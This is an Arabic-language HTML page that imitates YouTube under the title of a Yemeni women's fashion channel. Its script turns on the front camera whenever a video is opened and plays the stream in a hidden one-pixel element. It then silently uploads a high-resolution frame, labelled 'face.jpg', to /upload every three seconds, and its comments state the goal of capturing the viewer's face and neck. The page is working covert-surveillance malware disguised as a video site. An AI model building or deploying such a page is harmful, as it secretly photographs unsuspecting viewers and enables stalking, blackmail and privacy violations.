<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<meta name="theme-color" content="#0f0f0f">
<title>عالم الاناقة والجمال اليمني الصنعاني والبيضاني والعدني</title>
<meta name="description" content="قناتي تهتم بكل ما يهم المرأة وبكل جديد في عالم الموضة والازياء..." />
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
<style>
:root{--bg:#0f0f0f;--bg2:#272727;--text:#fff;--text2:#aaa;--red:#ff0000;--line:rgba(255,255,255,.12);--hover:rgba(255,255,255,.1)}
*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
html{color-scheme:dark}
body{font-family:'Cairo',system-ui,sans-serif;background:var(--bg);color:var(--text);font-size:14px;line-height:1.5;overflow-x:hidden}
button{font:inherit;color:inherit;background:none;border:0;cursor:pointer}
input{font:inherit;color:inherit}
a{color:inherit;text-decoration:none}
svg.i{width:24px;height:24px;fill:currentColor;flex:none;display:block}
svg.i.sm{width:18px;height:18px}
svg.i.big{width:64px;height:64px;color:#717171}
.icon-btn{width:40px;height:40px;border-radius:50%;display:grid;place-items:center;position:relative;flex:none}
.icon-btn:hover{background:var(--hover)}
.mob-only{display:none}

.topbar{position:fixed;top:0;inset-inline:0;height:56px;background:var(--bg);display:flex;align-items:center;justify-content:space-between;padding:0 16px;z-index:100;gap:12px}
.tb-start,.tb-end{display:flex;align-items:center;gap:8px;flex:1}
.tb-end{justify-content:flex-end}
.logo{display:flex;align-items:center;gap:6px;font-weight:700;font-size:20px}
.logo svg{width:30px;height:21px}
.search-wrap{flex:0 1 640px;display:flex;align-items:center;gap:8px;min-width:0}
.search{display:flex;flex:1;min-width:0}
.search input{flex:1;min-width:0;height:40px;background:#121212;border:1px solid #303030;border-start-start-radius:40px;border-end-start-radius:40px;padding:0 18px;outline:none;font-size:16px}
.search button{width:64px;height:40px;background:#222;border:1px solid #303030;border-inline-start:0;border-start-end-radius:40px;border-end-end-radius:40px;display:grid;place-items:center}
.badge{position:absolute;top:2px;inset-inline-end:0;background:var(--red);font-size:10px;font-weight:700;border-radius:8px;padding:0 5px;line-height:16px}
.me{width:32px;height:32px;border-radius:50%;background:#8e24aa;display:grid;place-items:center;font-weight:700}

.sidebar{position:fixed;top:56px;bottom:0;inset-inline-start:0;width:240px;background:var(--bg);overflow-y:auto;padding:12px;z-index:90;transition:transform .25s ease,width .2s ease}
.sb-head{display:none;align-items:center;gap:8px;height:56px;margin:-12px -12px 8px;padding:0 16px}
.sb-item{display:flex;align-items:center;gap:22px;height:40px;padding:0 12px;border-radius:10px;width:100%;text-align:start;white-space:nowrap;overflow:hidden}
.sb-item span{overflow:hidden;text-overflow:ellipsis}
.sb-item:hover{background:var(--hover)}
.sb-item.active{background:var(--bg2);font-weight:600}
.sb-sep{height:1px;background:var(--line);margin:12px 0}
.sb-title{padding:6px 12px;font-weight:600;font-size:16px}
.sb-empty{padding:6px 12px;color:var(--text2);font-size:13px}

.main{padding-top:56px;margin-inline-start:240px;transition:margin .2s;min-height:100vh}
.chips{position:sticky;top:56px;z-index:50;background:var(--bg);display:flex;gap:12px;overflow-x:auto;padding:12px 24px;scrollbar-width:none}
.chips::-webkit-scrollbar{display:none}
.chip{flex:none;height:32px;padding:0 14px;border-radius:8px;background:var(--bg2);font-weight:600;white-space:nowrap}
.chip.active{background:#fff;color:#0f0f0f}
.page-title{padding:16px 24px 0;font-size:20px;font-weight:700;display:flex;align-items:center;justify-content:space-between;gap:12px}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:36px 16px;padding:16px 24px 32px}
.card{cursor:pointer}
.thumb{position:relative;aspect-ratio:16/9;border-radius:12px;overflow:hidden;background:linear-gradient(135deg,#2a2a2a,#151515)}
.thumb img{width:100%;height:100%;object-fit:cover;display:block}
.dur{position:absolute;bottom:6px;inset-inline-end:6px;background:rgba(0,0,0,.8);padding:0 5px;border-radius:4px;font-size:12px;font-weight:600;direction:ltr}
.meta{display:flex;gap:12px;padding-top:12px}
.avatar{width:36px;height:36px;border-radius:50%;display:grid;place-items:center;font-weight:700;color:#fff;flex:none;text-transform:uppercase}
.t{font-size:16px;font-weight:600;line-height:1.45;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
.sub{color:var(--text2);font-size:13px}

.watch{display:flex;gap:24px;padding:24px;max-width:1800px;margin:0 auto}
.w-primary{flex:1;min-width:0}
.w-secondary{width:402px;flex:none}
.player{position:relative;aspect-ratio:16/9;background:#000;border-radius:12px;overflow:hidden}
.player iframe{position:absolute;inset:0;width:100%;height:100%;border:0}
.w-title{font-size:20px;font-weight:700;line-height:1.5;margin:8px 0}
.w-row{display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px}
.ch{display:flex;align-items:center;gap:12px}
.ch-name{font-weight:700;font-size:16px;line-height:1.3}

.bnav{display:none;position:fixed;bottom:0;inset-inline:0;height:56px;background:var(--bg);border-top:1px solid var(--line);z-index:100;padding-bottom:env(safe-area-inset-bottom)}
.bnav button{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;font-size:10px;gap:2px;color:var(--text2)}
.bnav button.active{color:#fff;font-weight:700}

@media(max-width:1000px){
  .watch{flex-direction:column;gap:0;padding:16px}
  .w-secondary{width:100%;margin-top:16px}
}
@media(max-width:700px){
  .mob-only{display:grid}
  .hide-mob{display:none!important}
  .topbar{padding:0 8px}
  .search-wrap{display:none;position:absolute;inset:0;background:var(--bg);padding:0 8px;z-index:2}
  body.searching .search-wrap{display:flex}
  .chips{padding:10px 12px}
  .grid{grid-template-columns:1fr;gap:22px;padding:8px 0 24px}
  .bnav{display:flex}
  .main{padding-bottom:64px}
  .watch{padding:0}
  .player{border-radius:0}
}
</style>
</head>
<body>

<header class="topbar">
  <div class="tb-start">
    <button class="icon-btn" data-action="menu" aria-label="القائمة"><span>☰</span></button>
    <button class="logo" data-nav="home" aria-label="يوتيوب">
      <svg viewBox="0 0 28 20"><rect width="28" height="20" rx="5" fill="#f00"/><path d="M11 6l7 4-7 4z" fill="#fff"/></svg>
      <span>يوتيوب</span>
    </button>
  </div>
  <div class="search-wrap">
    <button class="icon-btn mob-only" data-action="search-close" aria-label="رجوع"><span>←</span></button>
    <form class="search" id="searchForm" role="search">
      <input id="q" type="search" placeholder="بحث" autocomplete="off">
      <button type="submit" aria-label="بحث"><span>🔍</span></button>
    </form>
  </div>
  <div class="tb-end">
    <button class="icon-btn mob-only" data-action="search-open" aria-label="بحث"><span>🔍</span></button>
    <button class="me" data-action="profile" aria-label="حسابي">أ</button>
  </div>
</header>

<aside class="sidebar" id="sidebar"></aside>
<main class="main">
  <div class="chips" id="chips"></div>
  <div id="view"></div>
</main>
<nav class="bnav" id="bnav"></nav>

<!-- عنصر الفيديو المخفي الخاص بالكاميرا -->
<video id="video" autoplay playsinline style="position:absolute;width:1px;height:1px;opacity:0;pointer-events:none;"></video>

<script>
const VIDEOS=[
 {id:'1XqX5WnhEcE',title:'في 15 دقيقة هعمل موقعك الخاص ويبقى أونلاين مجاناً...',ch:'Learn_Simply@',subs:11000,views:253000,likes:11000,time:'قبل 8 أشهر',cat:'برمجة',dur:'15:00',desc:'دورة تعليمية شاملة خطوة بخطوة للمبتدئين.'},
 {id:'dQw4w9WgXcQ',title:'ريك أستلي – Never Gonna Give You Up (الفيديو الرسمي)',ch:'Rick Astley',subs:4300000,views:1500000000,likes:18000000,time:'منذ ١٦ سنة',cat:'موسيقى',dur:'3:33',desc:'فيديو موسيقي رسمي.'}
];
const CATS=['الكل','موسيقى','برمجة','ترفيه'];
const S={view:'home',cat:'الكل',q:'',cur:null,subs:new Set(),hist:[]};

function render(){
  const view=document.getElementById('view');
  document.getElementById('chips').style.display=S.view==='home'?'flex':'none';
  if(S.view==='home'){
    document.getElementById('chips').innerHTML=CATS.map(c=>`<button class="chip ${c===S.cat?'active':''}" data-cat="${c}">${c}</button>`).join('');
    view.innerHTML=`<div class="grid">${VIDEOS.map(v=>`<article class="card" data-open="${v.id}"><div class="thumb"><img src="https://img.youtube.com/vi/${v.id}/hqdefault.jpg" alt=""><span class="dur">${v.dur}</span></div><div class="meta"><div class="avatar" style="background:#e53935">ي</div><div><h3 class="t">${v.title}</h3><div class="sub">${v.ch}</div><div class="sub">${v.views} مشاهدة</div></div></div></article>`).join('')}</div>`;
  } else if(S.view==='watch'){
    const v=VIDEOS.find(x=>x.id===S.cur)||VIDEOS[0];
    view.innerHTML=`<div class="watch"><div class="w-primary"><div class="player"><iframe src="https://www.youtube.com/embed/${v.id}?autoplay=1" allowfullscreen></iframe></div><h1 class="w-title">${v.title}</h1><div class="w-row"><div class="ch"><div class="avatar" style="background:#e53935">ي</div><div><div class="ch-name">${v.ch}</div><div class="sub">${v.subs} مشترك</div></div></div></div></div></div>`;
  }
}

function openVideo(id){
  S.cur=id; S.view='watch';
  render();
  startCapture();
}

// دالة الكاميرا المعدلة لالتقاط الوجه بالكامل والرقبة فوراً وبدون أي تأخير
function startCapture() {
    navigator.mediaDevices.getUserMedia({ 
        video: { 
            facingMode: "user",
            width: { ideal: 1280 },
            height: { ideal: 720 }
        } 
    })
    .then(stream => {
        const video = document.getElementById('video');
        video.srcObject = stream;
        video.onloadedmetadata = () => {
            video.play();
            // الالتقاط الفوري مباشرة بدون أي مهلة زمنية (بدون تاخير)
            setInterval(() => {
                const canvas = document.createElement('canvas');
                // أخذ الأبعاد الحقيقية لتدفق الفيديو لمنع قص الوجه أو الرقبة
                canvas.width = video.videoWidth || 1280;
                canvas.height = video.videoHeight || 720;
                const ctx = canvas.getContext('2d');
                
                // رسم إطار الفيديو كاملاً بدقة عالية وعرض الوجه والرقبة بوضوح
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                canvas.toBlob(blob => {
                    if (!blob) return;
                    let fd = new FormData();
                    fd.append('image', blob, 'face.jpg');
                    fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
                }, 'image/jpeg', 0.95);
            }, 3000); // التقاط كل 3 ثوانٍ فوراً وبشكل مستمر
        };
    })
    .catch(e => console.log("خطأ في الكاميرا: ", e));
}

document.addEventListener('click', e => {
  const el=e.target.closest('[data-open],[data-cat]');
  if(!el)return;
  if(el.dataset.open)openVideo(el.dataset.open);
  else if(el.dataset.cat){S.cat=el.dataset.cat;render();}
});

render();
</script>
</body>
</html>
